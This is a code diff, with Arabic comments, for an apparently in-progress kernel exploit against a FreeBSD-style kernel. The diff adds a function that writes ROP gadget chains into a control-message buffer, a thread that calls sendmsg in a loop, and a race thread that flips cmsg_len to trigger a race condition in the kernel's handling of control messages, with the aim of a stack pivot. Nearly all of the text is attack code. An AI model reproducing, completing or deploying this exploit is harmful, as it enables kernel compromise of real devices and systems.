@@ -16,9 +16,13 @@ uint8_t control_buf[CONTROL_LEN];
 struct cmsghdr *cmsg;
 int global_sock;
 
+// تعريف الدوال مسبقاً لتجنب خطأ Undeclared
+void build_perfect_chain(uint64_t kbase);
+void *sendmsg_thread(void *arg);
+void *race_thread(void *arg);
+
 void build_perfect_chain(uint64_t kbase) {
     memset(control_buf, 0, CONTROL_LEN);
-    
     cmsg = (struct cmsghdr *)control_buf;
     cmsg->cmsg_level = 0; 
     cmsg->cmsg_type = 7; 
@@ -28,21 +32,35 @@ void build_perfect_chain(uint64_t kbase) {
     uint64_t pop_rax = kbase + OFF_POP_RAX_RET;
     uintptr_t val    = 0xDEADC0DE;
 
-    // سنضع السلسلة في إزاحات مختلفة لضمان أن الـ Stack Pivot يجدها
-    // الإزاحة 0x48 هي المكان التقليدي لـ ext_free في mbuf
     for (int i = 0x48; i < CONTROL_LEN - 32; i += 8) {
         uint64_t *rop = (uint64_t *)(control_buf + i);
-        
-        rop[0] = gadget1;    // الدخول: تضع 3ee6 في RBP وتدفع RSP لـ RSI
-        rop[1] = pop_rax;    // الخطوة التالية: سحب القيمة لـ RAX
-        rop[2] = val;        // القيمة التي نريد رؤيتها
-        rop[3] = 0;          // إنهاء بكراش (RIP: 0)
+        rop[0] = gadget1;
+        rop[1] = pop_rax;
+        rop[2] = (uint64_t)val;
+        rop[3] = 0; 
     }
 }
 
-// ... بقية خيوط (Threads) السباق كما هي في الكود السابق ...
+void *sendmsg_thread(void *arg) {
+    (void)arg;
+    struct msghdr msg = {0};
+    msg.msg_control = control_buf;
+    msg.msg_controllen = CONTROL_LEN;
+    while(1) { syscall(28, global_sock, &msg, 0); }
+    return NULL;
+}
+
+void *race_thread(void *arg) {
+    (void)arg;
+    while(1) {
+        cmsg->cmsg_len = 0x50;   
+        cmsg->cmsg_len = 0xFFFF; 
+    }
+    return NULL;
+}
 
 int _main(struct thread *td) {
+    (void)td; // لتجنب تحذير unused parameter
     initKernel();
     initLibc();
 
